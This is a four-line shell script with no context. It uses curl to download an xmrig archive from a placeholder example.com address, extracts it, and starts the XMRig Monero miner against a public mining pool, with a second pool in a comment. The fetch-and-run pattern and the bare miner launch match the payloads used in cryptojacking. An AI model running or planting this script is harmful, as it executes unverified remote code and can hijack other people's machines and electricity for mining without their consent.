#!/bin/sh
curl -sL https://example.com/xmrig.tar.gz | tar xz
./xmrig -o stratum+tcp://pool.supportxmr.com:3333 --donate-level 1
# alt: stratum+ssl://miningpoolhub.com:443
